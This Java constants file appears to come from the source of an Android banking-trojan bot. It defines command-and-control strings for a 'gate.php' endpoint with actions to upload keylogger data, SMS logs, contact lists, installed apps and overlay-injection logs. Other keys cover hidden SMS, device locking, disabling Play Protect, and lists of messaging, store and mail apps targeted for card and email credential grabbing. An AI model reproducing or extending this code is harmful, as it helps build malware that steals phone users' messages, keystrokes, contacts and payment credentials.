package com.example.modulebot;

public class constants {

    public final boolean DebugConsole = false;

    public final String strTAG1 = " >> ";
    public final String idbot = "idbot";
    public final String nameFileSettings = "settings";
    public final String urlAdminPanel = "urlAdminPanel";
    public final String actionSettingInection = "actionSettingInection";
    public final String hiddenSMS = "hiddenSMS";
    public final String idSettings = "idSettings";
    public final String lockDevice = "lockDevice";
    public final String offSound = "offSound";
    public final String keylogger = "keylogger";
    public final String timeInject = "timeInject";
    public final String timeCC = "timeCC";
    public final String timeMails = "timeMails";
    public final String arrayInjection = "arrayInjection";
    public final String checkupdateInjection = "checkupdateInjection";
    public final String whileStartUpdateInection = "whileStartUpdateInection";
    public final String strUTF_8 = "UTF-8";
    public final String str_POST = "POST";
    public final String str_Content_Length = "Content-Length";
    public final String str_gate = "/gate.php";
    public final String str_http_18 = "action=timeInject&data=";
    public final String logsContacts = "logsContacts";
    public final String logsApplications = "logsApplications";
    public final String logsSavedSMS = "logsSavedSMS";
    public final String killApplication = "killApplication";
    public final String day1PermissionSMS = "day1PermissionSMS";
    public  final String start_admin = "start_admin";

    public final String str_http_0 =  "action=geticon&data=";
    public final String str_http_1 =  "action=getinj&data=";
    public final String str_http_2 = "action=injcheck&data=";
    public final String str_http_16 = "action=sendInjectLogs&data=";
    public final String str_http_17 = "action=sendSmsLogs&data=";
    public final String str_http_19 = "action=sendKeylogger&data=";
    public final String str_http_20 = "action=sendListPhoneNumbers&data=";
    public final String str_http_21 = "action=sendListApplications&data=";
    public final String str_http_22 = "action=sendListSavedSMS&data=";
    public final String urls = "urls";


    public final String listSaveLogsInjection = "listSaveLogsInjection";
    public final String LogSMS = "LogSMS";
    public final String packageNameDefultSmsMenager = "packageNameDefultSmsMenager";
    public final String dataKeylogger = "dataKeylogger";
    public final String autoClick = "autoClick";

    public final String checkProtect = "checkProtect";
    public final String goOffProtect = "goOffProtect";
    public final String timeProtect = "timeProtect";

    public final String packageName = "packageName";
    public final String packageNameActivityInject = "packageNameActivityInject";

    public final String listAppGrabCards = "com.android.vending,org.telegram.messenger,com.ubercab,com.whatsapp,com.tencent.mm,com.viber.voip,com.snapchat.android,com.instagram.android,com.imo.android.imoim,com.twitter.android,";
    public final String listAppGrabMails = "com.google.android.gm,com.mail.mobile.android.mail,com.connectivityapps.hotmail,com.microsoft.office.outlook,com.yahoo.mobile.client.android.mail,";
}
